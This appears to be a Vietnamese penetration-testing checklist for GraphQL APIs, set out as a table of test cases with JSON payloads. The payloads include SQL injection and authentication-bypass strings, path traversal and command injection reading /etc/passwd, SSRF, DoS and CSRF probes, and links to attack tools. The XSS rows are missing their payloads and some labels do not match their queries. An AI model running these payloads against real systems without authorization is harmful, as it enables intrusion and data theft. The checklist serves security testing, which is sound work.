### **GraphQL Test Cases**

| Tên                                           | Mô tả                                                                                    | Payload                                                                                                                                                                                                                                                                                                                               |
| --------------------------------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Điểm cuối API GraphQL**                     | Điểm cuối phổ biến cho các API GraphQL                                                   | `{ "query": [ "/graphql", "/api/graphql", "/api/v1/graphql", "/graphql-server", "/graphql-service", "/graphql-api", "/graphql-endpoint", "/graphql-console", "/graphql-explorer", "/graphql-playground", "/graphql-dev", "/graphqld", "/gql", "/graphql/schema", "/graphql/query", "/graphql/mutation", "/graphql/subscriptions" ] }` |
| **Điểm cuối API GraphQL - Danh sách mở rộng** | Các điểm cuối khả dĩ của GraphQL APIs                                                    | `{ "query": "https://raw.githubusercontent.com/anmolksachan/anmolksachan.github.io/main/graphql/graphql-common.txt" }`                                                                                                                                                                                                                |
| **Truy vấn Introspection**                    | Kiểm tra xem truy vấn introspection có bị tắt không                                      | `{ "query": "{__schema{types{name}}}" }`                                                                                                                                                                                                                                                                                              |
| **SQL Injection**                             | Cố gắng thực hiện SQL injection                                                          | `{ "query": "query{users(where:{name:{_eq:\"' or 1=1 --\"}}){id,name}}" }`                                                                                                                                                                                                                                                            |
| **Cross-site scripting (XSS)**                | Cố gắng thực hiện tấn công XSS                                                           | `{ "query": "query{users(where:{name:{_contains:\"\"}}){id,name}}" }`                                                                                                                                                                                                                                                                 |
| **Path Traversal**                            | Cố gắng thực hiện path traversal                                                         | `{ "query": "query{file(path:\"../etc/passwd\"){name}}" }`                                                                                                                                                                                                                                                                            |
| **Command Injection**                         | Cố gắng thực hiện command injection                                                      | `{ "query": "query{runCommand(command:\"ls -la\")}" }`                                                                                                                                                                                                                                                                                |
| **Bypass Xác thực**                           | Cố gắng vượt qua xác thực                                                                | `{ "query": "query{user(id:\"1\"){id,name,email}}" }`                                                                                                                                                                                                                                                                                 |
| **Bypass Phân quyền**                         | Cố gắng vượt qua phân quyền                                                              | `{ "query": "query{secretData}" }`                                                                                                                                                                                                                                                                                                    |
| **SQL Injection - Tấn công UNION**            | Cố gắng thực hiện SQL injection bằng cách sử dụng UNION                                  | `{ "query": "query{users(where:{name:{_eq:\"' UNION SELECT * FROM users WHERE '1'='1\"}}){id,name}}" }`                                                                                                                                                                                                                               |
| **XSS - Bypass thẻ script**                   | Cố gắng thực hiện XSS bằng kỹ thuật bypass thẻ `<script>`                                | `{ "query": "query{users(where:{name:{_neq:\"\"}, name:{_contains:\"\"}}){id,name}}" }`                                                                                                                                                                                                                                               |
| **Path Traversal - Đường dẫn tuyệt đối**      | Cố gắng truy cập tệp qua đường dẫn tuyệt đối                                             | `{ "query": "query{file(path:\"/etc/passwd\"){name}}" }`                                                                                                                                                                                                                                                                              |
| **Command Injection - Thực thi lệnh tùy ý**   | Thử thực thi một lệnh tùy ý                                                              | `{ "query": "query{runCommand(command:\"cat /etc/passwd\")}" }`                                                                                                                                                                                                                                                                       |
| **Bypass Xác thực - SQL Injection**           | Cố gắng bypass xác thực bằng SQL injection                                               | `{ "query": "query{user(where:{email:{_eq:\"admin'--\"}, password:{_eq:\"' OR '1'='1\"}}){id,name,email}}" }`                                                                                                                                                                                                                         |
| **Bypass Phân quyền - Forced browsing**       | Cố gắng truy cập tài nguyên hạn chế bằng cưỡng ép đường dẫn                              | `{ "query": "query{file(path:\"/secret.txt\"){name, content}}" }`                                                                                                                                                                                                                                                                     |
| **Không có truy vấn**                         | Gửi yêu cầu không chứa tham số `query`                                                   | `{ "variables": {} }`                                                                                                                                                                                                                                                                                                                 |
| **Truy vấn rỗng**                             | Gửi truy vấn rỗng                                                                        | `{ "query": "", "variables": {} }`                                                                                                                                                                                                                                                                                                    |
| **Tham số truy vấn không hợp lệ**             | Gửi tham số truy vấn không hợp lệ                                                        | `{ "query": "invalidquery", "variables": {} }`                                                                                                                                                                                                                                                                                        |
| **Kiểu biến không hợp lệ**                    | Gửi biến với kiểu không hợp lệ                                                           | `{ "query": "query{users(where:{name:{_eq:$name}}){id,name}}", "variables": { "name": { "invalid": "type" } } }`                                                                                                                                                                                                                      |
| **Thiếu biến bắt buộc**                       | Gửi yêu cầu thiếu biến bắt buộc                                                          | `{ "query": "query{user(where:{email:{_eq:$email}}){id,name,email}}", "variables": { "name": "testuser" } }`                                                                                                                                                                                                                          |
| **SQL injection dạng số**                     | Cố gắng thực hiện SQL injection với kiểu số                                              | `{ "query": "query{users(where:{id:{_eq:\"1' or 1=1 --\"}}){id,name}}" }`                                                                                                                                                                                                                                                             |
| **Blind SQL injection**                       | Thử tấn công blind SQL injection                                                         | `{ "query": "query{users(where:{name:{_eq:\"admin\"},password:{_like:\"%$password%\"}}){id,name}}" }`                                                                                                                                                                                                                                 |
| **Server-side request forgery (SSRF)**        | Thử thực hiện SSRF                                                                       | `{ "query": "query{fetchUrl(url:\"https://example.com\")}" }`                                                                                                                                                                                                                                                                         |
| **Tấn công từ chối dịch vụ (DoS)**            | Cố gắng thực hiện DoS                                                                    | `{ "query": "query{users{...largeFragment}}fragment largeFragment on User{name}}" }`                                                                                                                                                                                                                                                  |
| **GraphQL Injection**                         | Cố gắng chích mã GraphQL độc hại                                                         | `{ "query": "mutation{addUser(input:{name:\"testuser\",email:\"testuser@example.com\"}){user{id,name,email}}}" }`                                                                                                                                                                                                                     |
| **Rò rỉ thông tin**                           | Cố truy cập thông tin nhạy cảm                                                           | `{ "query": "query{user(id:\"2\"){id,name,email,password}}" }`                                                                                                                                                                                                                                                                        |
| **Cross-site request forgery (CSRF)**         | Thử tấn công CSRF                                                                        | `{ "query": "mutation{updateUser(id:\"1\",input:{name:\"hacked\"}){user{id,name,email}}}" }`                                                                                                                                                                                                                                          |
| **Mutation không có xác thực**                | Gửi mutation khi chưa đăng nhập                                                          | `{ "query": "mutation{createPost(title:\"New Post\", content:\"Content of the post\"){id,title,content}}" }`                                                                                                                                                                                                                          |
| **Mutation thiếu quyền**                      | Gửi mutation khi không có đủ quyền                                                       | `{ "query": "mutation{deletePost(id:\"1\"){id,title,content}}" }`                                                                                                                                                                                                                                                                     |
| **Truy vấn với đối số không hợp lệ**          | Gửi truy vấn với đối số sai kiểu                                                         | `{ "query": "query{post(id:\"not_an_integer\"){id,title,content}}" }`                                                                                                                                                                                                                                                                 |
| **Truy vấn trả về quá nhiều kết quả**         | Cố gắng truy vấn toàn bộ dữ liệu                                                         | `{ "query": "query{posts{title}}" }`                                                                                                                                                                                                                                                                                                  |
| **Truy vấn trả về quá ít kết quả**            | Truy vấn không có dữ liệu                                                                | `{ "query": "query{post(id:\"999\"){title}}" }`                                                                                                                                                                                                                                                                                       |
| **Truy vấn sai định dạng**                    | Cố gắng thực hiện truy vấn sai cú pháp                                                   | `{ "query": "query{post(id:\"1\"){title, content}}" }`                                                                                                                                                                                                                                                                                |
| **Vượt giới hạn độ sâu truy vấn con**         | Gửi truy vấn lồng quá sâu                                                                | `{ "query": "query{post(id:\"1\"){title, comments{content, user{posts{content}}}}}" }`                                                                                                                                                                                                                                                |
| **Truy vấn thời gian thực thi dài**           | Truy vấn mất thời gian xử lý lớn                                                         | `{ "query": "query{longRunningQuery}" }`                                                                                                                                                                                                                                                                                              |
| **Công cụ quét lỗ hổng - GraphCrawler**       | Công cụ lấy schema, dò tìm dữ liệu nhạy cảm, brute force schema và tìm đường đi tới type | `{ "query": "https://github.com/gsmith257-cyber/GraphCrawler" }`                                                                                                                                                                                                                                                                      |
| **Công cụ quét lỗ hổng - GraphQLmap**         | Công cụ CLI tự động hóa tấn công GraphQL                                                 | `{ "query": "https://github.com/swisskyrepo/GraphQLmap" }`                                                                                                                                                                                                                                                                            |
| **Công cụ quét lỗ hổng - graphql-path-enum**  | Công cụ liệt kê các đường đi đến một type trong schema                                   | `{ "query": "https://gitlab.com/dee-see/graphql-path-enum" }`                                                                                                                                                                                                                                                                         |
| **GraphQLmap**                                | Dùng làm công cụ CLI tự động tấn công                                                    | `{ "query": [ "https://github.com/swisskyrepo/GraphQLmap" ] }`                                                                                                                                                                                                                                                                        |
